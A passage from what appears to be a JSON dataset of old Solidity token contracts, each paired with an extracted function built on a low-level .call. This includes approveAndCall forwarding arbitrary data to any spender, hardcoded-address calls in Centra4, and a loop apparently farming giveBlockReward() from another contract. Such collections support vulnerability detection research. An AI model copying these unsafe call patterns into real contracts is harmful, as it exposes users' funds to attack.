    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1600"
  },
  "filename": "36856.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract TheFoolRareToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function TheFoolRareToken(\n ) {\n balances[msg.sender] = 5000;\n totalSupply = 5000;\n name = \"TheFoolRareToken\";\n decimals = 0;\n symbol = \"TFRT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1601"
  },
  "filename": "36903.sol",
  "content": "pragma solidity ^0.4.13;\ncontract Centra4 {\n function transfer() returns (bool) {\n address contract_address;\n contract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\n address c1;\n address c2;\n uint256 k;\n k = 1;\n c2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;\n contract_address.call(\"register\", \"CentraToken\");\n if(!contract_address.call(bytes4(keccak256(\"transfer(address,uint256)\")),c2,k)) return false;\n return true;\n }\n}",
  "extract_feature": [
    "function transfer() returns (bool) {\naddress contract_address;\ncontract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\naddress c1;\naddress c2;\nuint256 k;\nk = 1;\nc2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;\ncontract_address.call(\"register\", \"CentraToken\");\nif(!contract_address.call(bytes4(keccak256(\"transfer(address,uint256)\")),c2,k)) return false;\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1602"
  },
  "filename": "36958.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract TokenCCC17 is HumanStandardToken(160000000000000000000000000, \"TokenCCC17\", 18, \"CCC17\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1603"
  },
  "filename": "36976.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract TokenBBB17 is HumanStandardToken(160000000000000000000000000, \"TokenBBB17\", 18, \"BBB17\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1604"
  },
  "filename": "37037.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\ncontract TokenAAA17 is HumanStandardToken(160000000000000000000000000, \"TokenAAA17\", 18, \"AAA17\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1605"
  },
  "filename": "37055.sol",
  "content": "pragma solidity ^0.4.16;\ncontract RealOldFuckMaker {\n address fuck = 0xc63e7b1DEcE63A77eD7E4Aeef5efb3b05C81438D;\n function makeOldFucks(uint32 number) {\n uint32 i;\n for (i = 0; i < number; i++) {\n fuck.call(bytes4(sha3(\"giveBlockReward()\")));\n }\n }\n}",
  "extract_feature": [
    "function makeOldFucks(uint32 number) {\nuint32 i;\nfor (i = 0; i < number; i++) {\nfuck.call(bytes4(sha3(\"giveBlockReward()\")));\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1606"
  },
  "filename": "37109.sol",
  "content": "library SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) constant returns (uint256);\n function transfer(address to, uint256 value) returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) returns (bool);\n function approve(address spender, uint256 value) returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) returns (bool) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) allowed;\n function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\n var _allowance = allowed[_from][msg.sender];\n balances[_to] = balances[_to].add(_value);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n return true;\n }\n function finishMinting() onlyOwner returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract TGEToken is MintableToken {\n string public name;\n uint8 public decimals = 18;\n string public symbol;\n string public version = \"H0.1\";\n function TGEToken(\n string _tokenName,\n string _tokenSymbol\n ) {\n name = _tokenName;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n assert(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function burn(uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n Transfer(msg.sender, 0x0, _value);\n return true;\n } else {\n return false;\n }\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nassert(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1607"
  },
  "filename": "37177.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MaggieToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MaggieToken(\n ) {\n balances[msg.sender] = 3200000000;\n totalSupply = 3200000000;\n name = \"Maggie Token\";\n decimals = 0;\n symbol = \"MAG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1608"
  },
  "filename": "37233.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract HumanStandardTokenFactory {\n mapping(address => address[]) public created;\n mapping(address => bool) public isHumanToken;\n bytes public humanStandardByteCode;\n function HumanStandardTokenFactory() {\n address verifiedToken = createHumanStandardToken(10000, \"Verify Token\", 3, \"VTX\");\n humanStandardByteCode = codeAt(verifiedToken);\n }\n function verifyHumanStandardToken(address _tokenContract) constant returns (bool) {\n bytes memory fetchedTokenByteCode = codeAt(_tokenContract);\n if (fetchedTokenByteCode.length != humanStandardByteCode.length) {\n return false;\n }\n for (uint i = 0; i < fetchedTokenByteCode.length; i ++) {\n if (fetchedTokenByteCode[i] != humanStandardByteCode[i]) {\n return false;\n }\n }\n return true;\n }\n function codeAt(address _addr) internal constant returns (bytes o_code) {\n assembly {\n let size := extcodesize(_addr)\n o_code := mload(0x40)\n mstore(0x40, add(o_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))\n mstore(o_code, size)\n extcodecopy(_addr, add(o_code, 0x20), 0, size)\n }\n }\n function createHumanStandardToken(uint256 _initialAmount, string _name, uint8 _decimals, string _symbol) returns (address) {\n HumanStandardToken newToken = (new HumanStandardToken(_initialAmount, _name, _decimals, _symbol));\n created[msg.sender].push(address(newToken));\n isHumanToken[address(newToken)] = true;\n newToken.transfer(msg.sender, _initialAmount);\n return address(newToken);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1609"
  },
  "filename": "37283.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20 {\n uint public totalSupply;\n function balanceOf(address who) constant returns (uint);\n function allowance(address owner, address spender) constant returns (uint);\n function transfer(address to, uint value) returns (bool ok);\n function transferFrom(address from, address to, uint value) returns (bool ok);\n function approve(address spender, uint value) returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract StandardToken is ERC20, SafeMath {\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n modifier onlyPayloadSize(uint size) {\n if(msg.data.length != size + 4) {\n revert();\n }\n _;\n }\n function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) revert();\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n }\ncontract Test20 is StandardToken {\n string public constant name = \"Test20\";\n string public constant symbol = \"TST\";\n uint public constant decimals = 18;\n string public version = \"1.0\";\n uint public totalSupply = 10000;\n function Test20() {\n balances[msg.sender] = totalSupply;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n }",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb160a"
  },
  "filename": "37324.sol",
  "content": "pragma solidity ^0.4.16;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n revert();\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"ClinicR\";\n decimals = 18;\n symbol = \"CLNR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb160b"
  },
  "filename": "37377.sol",
